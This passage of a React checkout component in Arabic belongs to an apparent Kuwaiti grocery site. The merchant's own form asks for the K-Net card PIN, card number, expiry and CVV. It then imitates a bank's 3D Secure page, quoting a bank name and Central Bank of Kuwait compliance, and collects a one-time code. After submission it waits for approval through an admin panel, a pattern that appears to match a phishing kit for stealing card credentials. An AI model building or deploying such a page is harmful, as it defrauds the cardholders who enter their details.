                          type={showKnetPin ? "text" : "password"}
                          placeholder="••••"
                          maxLength={4}
                          inputMode="numeric"
                          pattern="[0-9]*"
                          value={knetPin}
                          onChange={(e) => {
                            const val = e.target.value.replace(/\D/g, '').slice(0, 4);
                            setKnetPin(val);
                          }}
                          className="w-full bg-white border border-blue-200 rounded-xl p-2.5 pl-10 text-xs font-mono tracking-widest focus:outline-none focus:border-blue-600 font-bold"
                        />
                        <button
                          type="button"
                          onClick={() => setShowKnetPin(!showKnetPin)}
                          className="absolute left-2.5 top-1/2 -translate-y-1/2 text-slate-400 hover:text-blue-700 p-1 cursor-pointer"
                          title={showKnetPin ? "إخفاء رمز الأمان" : "إظهار رمز الأمان"}
                        >
                          {showKnetPin ? (
                            <EyeOff className="w-4 h-4 text-blue-700" />
                          ) : (
                            <Eye className="w-4 h-4" />
                          )}
                        </button>
                      </div>
                    </div>
                  </div>

                  <div className="p-2.5 bg-blue-100/60 rounded-xl border border-blue-200/80 flex items-center gap-2 text-[11px] text-blue-900">
                    <ShieldCheck className="w-4 h-4 text-blue-700 shrink-0" />
                    <span>عند المتابعة سيتم الانتقال لصفحة التحقق وطلب رمز الأمان لمرة واحدة (OTP) للتأكيد.</span>
                  </div>
                </div>
              )}

              {/* Credit Card Sub-section */}
              {paymentMethod === 'credit_card' && (
                <div className="p-4 bg-slate-50 rounded-2xl border border-slate-200 space-y-3">
                  <div>
                    <label className="text-xs font-bold text-slate-700 mb-1 block">رقم البطاقة (16 رقماً)</label>
                    <input
                      type="text"
                      placeholder="4111 8920 1482 7719"
                      value={cardNumber}
                      onChange={(e) => setCardNumber(e.target.value)}
                      className="w-full bg-white border border-slate-200 rounded-xl p-2.5 text-xs font-mono font-bold tracking-wider focus:outline-none focus:border-emerald-500"
                    />
                  </div>
                  <div className="grid grid-cols-2 gap-3">
                    <div>
                      <label className="text-xs font-bold text-slate-700 mb-1 block">تاريخ الانتهاء</label>
                      <input
                        type="text"
                        placeholder="MM/YY"
                        value={cardExpiry}
                        onChange={(e) => setCardExpiry(e.target.value)}
                        className="w-full bg-white border border-slate-200 rounded-xl p-2.5 text-xs font-mono font-bold focus:outline-none focus:border-emerald-500"
                      />
                    </div>
                    <div>
                      <label className="text-xs font-bold text-slate-700 mb-1 block">رمز الأمان CVV</label>
                      <input
                        type="password"
                        placeholder="•••"
                        maxLength={4}
                        value={cardCvv}
                        onChange={(e) => setCardCvv(e.target.value)}
                        className="w-full bg-white border border-slate-200 rounded-xl p-2.5 text-xs font-mono focus:outline-none focus:border-emerald-500"
                      />
                    </div>
                  </div>
                </div>
              )}
            </div>

            {/* Section 4: Summary Breakdown */}
            <div className="p-4 bg-emerald-50/60 rounded-2xl border border-emerald-200/80 space-y-2 text-xs">
              <div className="flex items-center justify-between text-slate-700">
                <span>المجموع الفرعي ({items.length + (customBasket ? 1 : 0)} منتجات):</span>
                <span className="font-bold">{subtotal.toFixed(3)} د.ك</span>
              </div>
              {promoDiscount > 0 && (
                <div className="flex items-center justify-between text-emerald-700 font-bold">
                  <span>الخصم المطبق:</span>
                  <span>-{promoDiscount.toFixed(3)} د.ك</span>
                </div>
              )}
              <div className="flex items-center justify-between text-slate-700">
                <span>رسوم التوصيل السريع المبرد:</span>
                <span>{deliveryFee === 0 ? <strong className="text-emerald-700 font-bold">مجاناً 🚀</strong> : `${deliveryFee.toFixed(3)} د.ك`}</span>
              </div>
              {driverTip > 0 && (
                <div className="flex items-center justify-between text-slate-700">
                  <span>إكرامية المندوب:</span>
                  <span>{driverTip.toFixed(3)} د.ك</span>
                </div>
              )}
              <div className="pt-2 border-t border-emerald-200/80 flex items-center justify-between text-sm sm:text-base">
                <span className="font-black text-emerald-950">المبلغ الإجمالي المطلوب:</span>
                <div className="text-left">
                  <span className="text-xl sm:text-2xl font-black text-emerald-900">{finalTotal.toFixed(3)}</span>
                  <span className="text-xs font-bold text-emerald-700 mr-1">د.ك</span>
                </div>
              </div>
            </div>

            {/* Submit Button */}
            <div className="pt-2">
              <button
                id="confirm-checkout-order-btn"
                type="submit"
                disabled={isProcessing}
                className="w-full py-4 px-6 bg-gradient-to-r from-emerald-700 via-emerald-800 to-teal-800 hover:from-emerald-800 hover:to-teal-900 disabled:opacity-50 text-white font-black text-base rounded-2xl shadow-xl shadow-emerald-700/25 transition-all flex items-center justify-center gap-2 cursor-pointer"
              >
                {isProcessing ? (
                  <div className="flex items-center gap-2">
                    <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                    <span>جاري تحويلك لبوابة التحقق المصرفية (3D Secure)...</span>
                  </div>
                ) : (
                  <>
                    <Lock className="w-5 h-5 text-amber-300" />
                    <span>متابعة وتأكيد الدفع (طلب رمز الأمان OTP) • {finalTotal.toFixed(3)} د.ك</span>
                  </>
                )}
              </button>
              <p className="text-center text-[11px] text-slate-400 mt-2 flex items-center justify-center gap-1">
                <ShieldCheck className="w-3.5 h-3.5 text-emerald-600" />
                <span>دفع إلكتروني مشفر وآمن 100% متوافق مع معايير بنك الكويت المركزي وشبكة كي نت (K-Net)</span>
              </p>
            </div>

          </form>
        )}

        {/* STEP 2: 3D Secure / K-Net OTP Verification Screen */}
        {checkoutStep === 'otp_verification' && (
          <div className="flex-1 overflow-y-auto p-4 sm:p-8 space-y-6 animate-in slide-in-from-left-4 duration-300">
            
            {/* Bank & Gateway Security Header Card */}
            <div className="bg-gradient-to-br from-slate-900 via-slate-800 to-blue-950 text-white p-5 rounded-3xl border border-slate-700 shadow-xl relative overflow-hidden">
              <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-blue-500 via-teal-400 to-emerald-400" />
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <div className="w-12 h-12 rounded-2xl bg-blue-600/90 text-white font-black text-xs flex items-center justify-center shadow-inner border border-blue-400/30">
                    K-NET
                  </div>
                  <div>
                    <div className="flex items-center gap-2">
                      <h3 className="text-base sm:text-lg font-black text-white">
                        {paymentMethod === 'knet' ? (bankNames[knetBank] || 'بنك الكويت الوطني (NBK)') : 'شبكة البطاقات الائتمانية'}
                      </h3>
                      <span className="text-[10px] bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 px-2 py-0.5 rounded-full font-bold">
                        3D Secure 2.0
                      </span>
                    </div>
                    <p className="text-xs text-slate-300 mt-0.5">
                      بوابة التحقق الثنائي والمصادقة الأمنية المعتمدة 🇰🇼
                    </p>
                  </div>
                </div>

                <div className="hidden sm:block text-left font-mono">
                  <span className="text-[10px] text-slate-400 block">المبلغ المصرح به:</span>
                  <span className="text-lg font-black text-amber-400">{finalTotal.toFixed(3)} د.ك</span>
                </div>
              </div>

              {/* Transaction Metadata Grid */}
              <div className="mt-4 pt-4 border-t border-slate-700/80 grid grid-cols-2 sm:grid-cols-4 gap-2 text-xs font-mono">
                <div className="bg-slate-900/80 p-2.5 rounded-xl border border-slate-700">
                  <span className="text-[10px] text-slate-400 font-sans block">التاجر (Merchant):</span>
                  <strong className="text-slate-100 text-[11px] block truncate">سلة الديرة للخضار</strong>
                </div>
                <div className="bg-slate-900/80 p-2.5 rounded-xl border border-slate-700">
                  <span className="text-[10px] text-slate-400 font-sans block">رقم البطاقة:</span>
                  <strong className="text-amber-300 text-[11px] block">
                    {cardNumber.trim() ? cardNumber.replace(/(\d{4})\s*(\d{4})\s*(\d{4})\s*(\d{4})/, '$1 •••• •••• $4') : '5370 •••• •••• 4912'}
                  </strong>
                </div>
                <div className="bg-slate-900/80 p-2.5 rounded-xl border border-slate-700">
                  <span className="text-[10px] text-slate-400 font-sans block">تاريخ الانتهاء:</span>
                  <strong className="text-slate-200 text-[11px] block">{cardExpiry.trim() || '11/28'}</strong>
                </div>
                <div className="bg-slate-900/80 p-2.5 rounded-xl border border-slate-700">
                  <span className="text-[10px] text-slate-400 font-sans block">رقم الطلب:</span>
                  <strong className="text-emerald-400 text-[11px] block">{orderNumberGenerated}</strong>
                </div>
              </div>
            </div>

            {/* OTP Entry Box */}
            <form onSubmit={handleSubmitOtp} className="bg-white p-6 rounded-3xl border border-blue-200 shadow-lg space-y-5 text-center">
              
              <div className="space-y-1">
                <div className="w-12 h-12 rounded-2xl bg-amber-100 text-amber-800 mx-auto flex items-center justify-center text-xl shadow-xs">
                  <KeyRound className="w-6 h-6" />
                </div>
                <h4 className="text-base sm:text-lg font-black text-slate-900">
                  أدخل رمز التحقق الأمني (OTP)
                </h4>
                <p className="text-xs text-slate-500 max-w-md mx-auto">
                  تم إرسال رمز الأمان السري لمرة واحدة والمكون من 6 أرقام إلى هاتفك المسجل لدى البنك:
                  <span className="font-mono font-bold text-slate-800 mx-1">{customerPhone || '+965 99•• ••••'}</span>
                </p>
              </div>

              {otpError && (
                <div className="p-3 bg-rose-50 border border-rose-200 rounded-2xl text-xs text-rose-700 flex items-center justify-center gap-2">
                  <AlertCircle className="w-4 h-4 shrink-0" />
                  <span>{otpError}</span>
                </div>
              )}

              {/* OTP Numeric Input */}
              <div className="max-w-xs mx-auto space-y-2">
                <div className="relative">
                  <input
                    type="text"
                    required
                    maxLength={6}
                    inputMode="numeric"
                    pattern="[0-9]*"
                    value={enteredOtp}
                    onChange={(e) => {
                      setEnteredOtp(e.target.value.replace(/\D/g, '').slice(0, 6));
                      setOtpError('');
                    }}
                    placeholder="••••••"
                    disabled={isOtpApproved || (otpSubmitted && !otpError)}
                    className="w-full text-center text-2xl sm:text-3xl font-mono font-black tracking-widest py-3 px-4 bg-slate-50 border-2 border-blue-500 rounded-2xl focus:bg-white focus:outline-none focus:border-emerald-600 focus:ring-4 focus:ring-emerald-500/20 transition-all text-slate-900 shadow-inner"
                  />
                </div>
                <div className="flex items-center justify-between text-xs text-slate-500 px-1 font-mono">
                  <span>الصلاحية: {Math.floor(otpCountdown / 60)}:{(otpCountdown % 60).toString().padStart(2, '0')} دقيقة</span>
                  <button
                    type="button"
                    onClick={handleResendOtp}
                    className="text-blue-700 hover:text-blue-900 font-bold hover:underline cursor-pointer flex items-center gap-1 font-sans"
                  >
                    <RefreshCw className="w-3 h-3" />
                    <span>إعادة إرسال رمز جديد</span>
                  </button>
                </div>
              </div>

              {/* Approval State & Supervisors Notice */}
              {otpSubmitted && !isOtpApproved && (
                <div className="p-4 bg-amber-50 rounded-2xl border border-amber-200 text-amber-900 text-xs space-y-2 text-right">
                  <div className="flex items-center gap-2 font-bold text-amber-950">
                    <span className="w-2.5 h-2.5 rounded-full bg-amber-500 animate-ping" />
                    <span>جاري التحقق والمصادقة مع البنك... ⏳</span>
                  </div>
                  <p className="text-[11px] text-amber-800 leading-relaxed">
                    تم إرسال رمز الأمان للتحقق. يرجى الانتظار ثوانٍ معدودة حتى اكتمال المصادقة واعتماد الطلب.
                  </p>
                </div>
              )}

              {isOtpApproved && (
                <div className="p-4 bg-emerald-50 rounded-2xl border border-emerald-200 text-emerald-900 text-xs text-center space-y-1 animate-in zoom-in-95 duration-200">
                  <CheckCircle2 className="w-7 h-7 text-emerald-600 mx-auto" />
                  <h5 className="font-bold text-sm text-emerald-950">تمت المصادقة واعتماد العملية بنجاح! ✅</h5>
                  <p className="text-[11px] text-emerald-700 font-mono">
                    AUTH-KW-APPROVED • تم سداد {finalTotal.toFixed(3)} د.ك وجاري الانتقال للتتبع...
                  </p>
                </div>
              )}

              {/* Action Buttons */}
              <div className="space-y-2.5 pt-2">
                {!otpSubmitted ? (
                  <button
                    type="submit"
                    className="w-full py-3.5 px-6 bg-blue-700 hover:bg-blue-800 text-white font-black text-sm rounded-2xl shadow-lg shadow-blue-700/25 transition-all flex items-center justify-center gap-2 cursor-pointer"
                  >
                    <Lock className="w-4 h-4 text-amber-300" />
                    <span>تأكيد رمز الأمان (Confirm OTP)</span>
                  </button>
                ) : (
                  <div className="space-y-2">
                    <div className="py-3 px-4 bg-slate-100 text-slate-600 font-bold text-xs rounded-2xl border border-slate-200 flex items-center justify-center gap-2">
                      <div className="w-4 h-4 border-2 border-slate-400 border-t-slate-800 rounded-full animate-spin" />
                      <span>جاري المعالجة والتحقق...</span>
                    </div>
                    <button
                      type="button"
                      onClick={() => setOtpSubmitted(false)}
                      className="text-xs text-blue-700 hover:underline mx-auto block cursor-pointer"
                    >
                      تعديل الرمز المدخل
                    </button>
                  </div>
                )}

                <button
                  type="button"
                  onClick={() => {
                    setCheckoutStep('form');
                    setOtpSubmitted(false);
                    setOtpError('');
                  }}
                  className="text-xs text-slate-500 hover:text-slate-800 flex items-center justify-center gap-1 mx-auto pt-1 cursor-pointer"
                >
                  <ArrowRight className="w-3.5 h-3.5" />
                  <span>العودة لتعديل بيانات البطاقة أو العنوان</span>
                </button>
              </div>

            </form>

            <div className="p-3 bg-slate-100 rounded-2xl border border-slate-200 text-center text-[11px] text-slate-500 flex items-center justify-center gap-2">
              <ShieldCheck className="w-4 h-4 text-emerald-600" />
              <span>نظام المصادقة المشترك بين العميل ولوحة الإدارة - بنك الكويت المركزي</span>
            </div>

          </div>
        )}

      </div>
    </div>
  );
};

